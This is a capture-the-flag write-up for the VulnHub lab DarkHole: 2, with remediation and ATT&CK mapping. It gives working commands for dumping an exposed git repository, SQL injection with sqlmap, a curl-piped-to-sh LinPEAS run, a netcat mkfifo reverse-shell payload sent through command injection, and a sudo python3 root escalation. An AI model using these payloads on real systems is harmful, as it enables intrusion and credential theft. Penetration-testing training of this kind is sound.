# DarkHole: 2 — Writeup

> A box named DarkHole delivers exactly what it promises: a deep, dark rabbit hole that starts with a public git repository and ends with `sudo python3`. ( ͡° ͜ʖ ͡°)
>
> Every layer of this machine requires a different technique. Git history dumps credentials, SQL injection pivots to a new user, port forwarding reveals a hidden internal app, a bash history file casually stores another password in plaintext, and then one `sudo -l` call closes the loop. None of these steps are exotic. All of them are embarrassingly common in real environments. ¯\_(ツ)_/¯

---

| Field | Value |
|-------|-------|
| **Level** | Medium-Hard |
| **Target VM** | DarkHole: 2 (Linux) |
| **Attacker VM** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/darkhole-2,740/ |
| **Techniques** | Exposed `.git` directory dump, credential recovery from git history, authenticated SQL injection, SSH access, local port forwarding, command injection in internal PHP app, bash history credential extraction, sudo python3 privilege escalation |
| **CVEs** | No specific CVEs. All attack vectors are misconfigurations: exposed `.git`, SQLi in authenticated endpoint, command injection in internal app, NOPASSWD `sudo python3`, credentials in bash history. |
| **APT Groups** | APT41 (combined web exploitation with pivot to internal services), Lazarus Group (credential chaining across services), FIN7 (git-based source code and credential exfiltration) |

---

## Attack Summary

```
[nmap] ports 22, 80
    |
    v
[web] .git directory exposed
    |
    v
[git-dumper] download full repository history
    |
    v
[git diff <commit>] removed credentials: lush@admin.com:321
    |
    v
[web login] authenticated session
    |
    v
[Burp Suite] intercept cookie -> save to file
    |
    v
[SQLMap] sqlmap -r sql --dbs -> darkhole_2 -> dump: jehad:fool
    |
    v
[ssh jehad@TARGET] SSH access
    |
    v
[LinPEAS] internal app on localhost:9999 owned by losy
    |
    v
[ssh -L 9999:localhost:9999] port forward to attacker
    |
    v
[http://127.0.0.1:9999/?cmd=id] command injection confirmed
    |
    v
[nc -lvp 8888] reverse shell as losy
    |
    v
[cat .bash_history] password: gang
    |
    v
[su losy; sudo -l] (root) NOPASSWD: /usr/bin/python3
    |
    v
[sudo python3 -c 'import pty; pty.spawn("/bin/bash")'] -> root
    |
    v
[cat /root/root.txt] DONE
```

---

## Methodology

1. Network discovery and port scan
2. Exposed `.git` directory discovery and full repository dump
3. Credential extraction from git diff (deleted lines in commit history)
4. Web application login with recovered credentials
5. SQL injection via Burp Suite cookie intercept to dump additional user credentials
6. SSH access as `jehad` and LinPEAS-assisted internal service discovery
7. SSH local port forwarding to reach internal PHP app on localhost:9999
8. Command injection in internal app to land reverse shell as `losy`
9. Bash history credential extraction
10. Privilege escalation via `sudo python3` (GTFOBins)

---

## Step 1: Network Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
export TARGET=192.168.1.179
nmap -A $TARGET
```

Expected output (trimmed):

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

Two ports. Standard. But the web server has something unusual: a `.git` directory.

> **MITRE TTP:** T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 2: Dump the Exposed Git Repository

The web root or a subdirectory has a `.git` directory accessible over HTTP. This allows reconstructing the entire repository including all commit history, including commits where credentials were added and then deleted.

```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
mkdir backup
python3 git_dumper.py http://$TARGET/.git/ backup
cd backup
```

Review the commit history:

```bash
git log
```

Identify the older commit that likely contains credentials before they were removed. Then diff it:

```bash
git diff a4d900a8d85e8938d3601f3cef113ee293028e10
```

In the diff output, look for lines starting with `-` (removed lines). You will find:

```diff
-email: lush@admin.com
-password: 321
```

Credentials extracted: `lush@admin.com` / `321`. ( ͡° ͜ʖ ͡°)

> **MITRE TTP:** T1213 — Data from Information Repositories; T1552.001 — Credentials in Files

> **Real-world note:** Deleting credentials from source code and committing the deletion does NOT remove them from git history. The entire history is preserved, including the "deleted" lines. FIN7 has used this technique to extract database credentials, API keys, and admin passwords from exposed repositories. Over 4 million secrets have been found in public GitHub repositories using similar techniques.

> **Alternative:** `truffleHog` or `gitleaks` can scan the repository automatically for credentials: `gitleaks detect --source ./backup`

---

## Step 3: Web Login and SQL Injection via Burp Suite

Log in to the web application at `http://$TARGET/` with the recovered credentials:

- Email: `lush@admin.com`
- Password: `321`

Once logged in, intercept any authenticated request with Burp Suite. The session cookie authenticates the request. Save the full HTTP request (with cookie) to a file named `sql`.

Run SQLMap against the authenticated endpoint:

```bash
sqlmap -r sql --dbs --batch
```

Wait for the databases to enumerate. Then target the application database:

```bash
sqlmap -r sql -D darkhole_2 --dump-all --batch
```

Credentials extracted from the `darkhole_2` database:

| User | Password |
|------|----------|
| `jehad` | `fool` |

> **MITRE TTP:** T1190 — Exploit Public-Facing Application; T1078.003 — Valid Accounts: Local Accounts

> **Real-world note:** SQL injection in authenticated endpoints is frequently overlooked. Developers often assume that authenticated users are trusted. APT41 has demonstrated this pattern against enterprise web applications where the authentication layer was solid but the internal logic was vulnerable to injection after authentication.

> **Alternative:** Manual SQL injection via Burp Repeater with payloads like `' OR '1'='1` in POST parameters, or using `sqlmap --forms` to auto-detect forms.

---

## Step 4: SSH Access as jehad

Use the credentials dumped from the database to log in via SSH:

```bash
ssh jehad@$TARGET
# password: fool
id
# uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
```

Initial foothold established. Now find what else is running on this box.

> **MITRE TTP:** T1021.004 — Remote Services: SSH; T1078 — Valid Accounts

---

## Step 5: Internal Service Discovery with LinPEAS

Download and run LinPEAS to enumerate the local environment:

```bash
curl -sL https://raw.githubusercontent.com/carlospalop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

LinPEAS identifies a PHP application running on `localhost:9999` as the user `losy`. The service is bound to loopback only, so it is not directly reachable from the attacker machine.

> **MITRE TTP:** T1049 — System Network Connections Discovery; T1057 — Process Discovery

> **Alternative:** Manual enumeration with `netstat -antp | grep LISTEN` or `ss -tlnp` achieves the same result without downloading LinPEAS.

---

## Step 6: SSH Local Port Forwarding

Open a second terminal and forward port 9999 from the target's localhost to your attacker machine:

```bash
ssh jehad@$TARGET -L 9999:localhost:9999
```

Now browse to `http://127.0.0.1:9999/?cmd=id` on the attacker machine.

The response includes the output of `id`, confirming remote code execution as `losy`. ( ͡° ͜ʖ ͡°)

> **MITRE TTP:** T1572 — Protocol Tunneling; T1090 — Proxy

---

## Step 7: Reverse Shell via Command Injection

The `cmd` parameter in the internal PHP app passes input directly to the system shell. Craft a reverse shell payload.

URL-encode the payload (Burp Decoder or Python):

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.107 8888 >/tmp/f'))"
```

Start a listener:

```bash
nc -lvp 8888
```

Send the payload via the browser or curl:

```bash
curl "http://127.0.0.1:9999/?cmd=rm+/tmp/f%3Bmkfifo+/tmp/f%3Bcat+/tmp/f%7C/bin/sh+-i+2%3E%261%7Cnc+192.168.1.107+8888+%3E/tmp/f"
```

A shell arrives as `losy`. Upgrade to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **MITRE TTP:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1105 — Ingress Tool Transfer

---

## Step 8: Credential Extraction from Bash History

Read the user flag and check the bash history:

```bash
cd /home/losy
cat user.txt
cat .bash_history
```

The bash history contains a `su` command with the password visible in plaintext:

```
su losy
gang
```

Password for `losy`: `gang`. ¯\_(ツ)_/¯

> **MITRE TTP:** T1552.003 — Credentials in Files: Bash History

> **Real-world note:** Passwords typed directly into the terminal are stored in bash history. This is one of the most common ways credentials are accidentally exposed in real Linux environments. Many attackers check `.bash_history` as a routine step during post-exploitation.

---

## Step 9: Privilege Escalation via sudo python3

Switch to `losy` with the recovered password and check sudo permissions:

```bash
su losy
# password: gang
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/python3
```

`losy` can run `python3` as root without a password. This is a GTFOBins classic:

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Root shell. ᕕ( ᐛ )ᕗ

Read the root flag:

```bash
cat /root/root.txt
```

> **MITRE TTP:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

> **Real-world note:** `sudo python3` without restriction is listed on GTFOBins and is actively searched for by post-exploitation frameworks. Any NOPASSWD sudo entry for an interpreted language (Python, Perl, Ruby, Node.js) effectively grants unrestricted root access.

---

## Captured Flags / Hashes / Creds

| Item | Value |
|------|-------|
| Git diff credentials | `lush@admin.com` / `321` |
| SQL dump credentials | `jehad` / `fool` |
| Bash history credentials | `losy` / `gang` |
| User flag | `/home/losy/user.txt` |
| Root flag | `/root/root.txt` |

---

## Lessons Learned

1. **Deleting credentials from git does NOT remove them from history.** The entire commit log is preserved. An exposed `.git` directory on a web server is equivalent to publishing your source code and all of its secrets.

2. **SQL injection in authenticated endpoints** is as dangerous as in public-facing login forms. Never trust authenticated users with unsanitized input.

3. **Internal services on localhost are not protected once the host is compromised.** SSH port forwarding trivially bridges the attacker to any loopback-bound service.

4. **`sudo python3 NOPASSWD` is unrestricted root access.** Any scripting language with NOPASSWD sudo bypasses all access controls. GTFOBins documents dozens of these patterns.

5. **Bash history stores command arguments in plaintext, including passwords.** Users frequently type `su user` followed by the password on the next line, or embed passwords in command flags. Post-exploitation scripts check this file automatically.

**Real-World Relevance:** This attack chain mirrors documented intrusions by APT41 against enterprise web applications: git repo leak, credential chain, pivot to internal service, escalation via misconfigured sudo. The fact that each step uses a different user account is also realistic: attackers frequently pivot through multiple local users before reaching root, collecting credentials along the way.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Tool |
|--------|-----------|-----|------|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Credential Access | Data from Information Repositories | T1213 | git-dumper |
| Credential Access | Credentials in Files | T1552.001 | git diff |
| Credential Access | Bash History | T1552.003 | cat .bash_history |
| Initial Access | Exploit Public-Facing Application | T1190 | SQLMap |
| Initial Access | Valid Accounts: Local Accounts | T1078.003 | SSH |
| Discovery | System Network Connections Discovery | T1049 | LinPEAS / netstat |
| Discovery | Process Discovery | T1057 | LinPEAS / ps |
| Lateral Movement | Remote Services: SSH | T1021.004 | ssh -L port forward |
| Lateral Movement | Protocol Tunneling | T1572 | SSH local forward |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | cmd= injection |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 | sudo python3 |
| Command and Control | Ingress Tool Transfer | T1105 | curl / LinPEAS |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|----------|---------|--------|
| Identify (ID.AM) | Asset inventory | Catalog internal services including loopback-bound processes and their owners |
| Protect (PR.AC) | Access control | Remove `sudo python3 NOPASSWD`; review all sudoers entries |
| Protect (PR.DS) | Data security | Block `.git` HTTP access; add pre-commit hooks to scan for secrets |
| Detect (DE.CM) | Monitoring | Alert on SQLi patterns in WAF; monitor bash history creation in sensitive accounts |
| Protect (PR.IP) | Protective technology | Sanitize `cmd` parameter in internal PHP app; use parameterized execution |

### NIST SP 800-53 Rev. 5

| Control | Description |
|---------|-------------|
| AC-6 | Least Privilege: remove NOPASSWD sudo for interpreter binaries |
| SI-10 | Information Input Validation: sanitize the `cmd` parameter; reject shell metacharacters |
| SA-15 | Development Process: require secret scanning (gitleaks, truffleHog) in CI/CD before merge |
| SC-7 | Boundary Protection: firewall internal PHP apps even on loopback; restrict who can forward ports |
| AU-3 | Content of Audit Records: log all `sudo` invocations with command and arguments |
| IA-5 | Authenticator Management: enforce `HISTCONTROL=ignorespace` and `HISTFILE=/dev/null` for service accounts |

### CISA KEV

No CVEs from this box appear in the CISA KEV catalog. All exploited vectors are misconfigurations. The closest relevant guidance is CISA's advisory on securing web-exposed version control systems.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|--------|----------|-----|
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | Internal PHP services not inventoried; no configuration review process |
| Identity and Access Management (IAM) | MIL-2 | NOPASSWD sudo for interpreter binaries; no privileged access review |
| Threat and Vulnerability Management (THREAT) | MIL-1 | SQLi and command injection not detected; no secret scanning in development |
| Situational Awareness (SA) | MIL-1 | No monitoring for port forwarding, internal service access, or sudo invocations |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|------------------|----|-----------|
| Application Configuration Hardening | D3-ACH | Block `.git` HTTP access; sanitize `cmd` parameter |
| Credential Hardening | D3-CH | Remove credentials from git history; use environment variables or vaults |
| Software Update | D3-SU | Use parameterized queries to eliminate SQL injection |
| Network Traffic Filtering | D3-NTF | Restrict SSH port forwarding for non-admin users (AllowTcpForwarding no) |
| Executable Allowlisting | D3-EAL | Restrict sudo entries to specific, non-interpreter commands |
| Process Spawn Analysis | D3-PSA | Alert on `python3` spawned with root privileges outside expected processes |

---

## Final Thoughts

DarkHole: 2 earns its "Medium-Hard" label. The techniques are not individually difficult, but the chain is long and each step requires a slightly different mindset. The machine teaches you to think laterally: not just "what can I do here?" but "where does this lead next?"

The git history trick is the highlight. Many developers believe deletion equals erasure. It does not. Understanding git commit history as an attack surface is a skill that pays off constantly in real bug bounty and red team work.

Big thanks to the DarkHole series author for building a machine that respects the player's intelligence and teaches real-world attack patterns without shortcuts.

Thanks guys!! (❍ᴥ❍ʋ)
